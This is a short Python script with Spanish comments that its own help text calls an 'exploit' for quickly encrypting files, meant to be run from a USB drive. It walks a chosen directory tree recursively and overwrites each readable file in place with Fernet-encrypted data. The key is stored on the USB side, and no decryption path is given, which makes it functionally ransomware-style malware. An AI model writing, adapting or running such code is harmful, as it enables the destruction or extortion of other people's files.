from cryptography.fernet import Fernet
import argparse
import os

arg = None

#Funcion para saber que archivos no se encriptaron por permisos admin
def log_file(archivo_error):
    if os.path.exists(str(args.key+'/log_error.txt')):
        with open(str(args.key+'/log_error.txt'),'r+') as file:
            file.seek(0,2)
            file.write(str(archivo_error+'\n'))
    else:
        with open(str(args.key+'/log_error.txt'),'w') as file:
            file.write(str(archivo_error+'\n'))

#Funcion para encriptar archivo por archivo
def encrypt(item,key):
    f = Fernet(key)
    try:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypt_data = f.encrypt(file_data)
        with open(item,'wb') as file:
            file.write(encrypt_data)
    except PermissionError:
         log_file(item)

#Funcion para guardar la clave de encriptacion
def generar_key(path):
	key = Fernet.generate_key()
	with open(path+'/key.key','wb') as key_file:
		key_file.write(key)

#Funcion para cargar la llave
def cargar_key(path) -> str:
	return open(path+'/key.key', 'rb').read()

#Muestra tods los archivos de una pc
def mostrar_archivos(directorio):
    lista_archivos = os.listdir(directorio)
    for archivo in lista_archivos:      
        #Si no existe un . en el archivo analizado asumo que es un carpeta y entro
        if not '.' in archivo:
            #Concateno el valor actual de lista de archivos con la sgte carpeta
            lista_archivos = os.path.join(directorio,archivo)
            if os.path.isdir(lista_archivos):
                mostrar_archivos(lista_archivos)
            #Si no es un directorio procedemos a encriptarlo
        else:
            encrypt(directorio+'/'+archivo, cargar_key(args.key))
	
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Exploit para encriptar archivos de manera\
    rapida, pruebame via USB y agrega la extencion")
    parser.add_argument('-s',"--source" ,type=str ,help="Escoge el directorio a encriptar")
    parser.add_argument('-k',"--key", type=str ,default=os.getcwd(), help="Escoge la direccion de la llave,default (USB)")
    args = parser.parse_args()
    generar_key(args.key)
    mostrar_archivos(args.source)


 
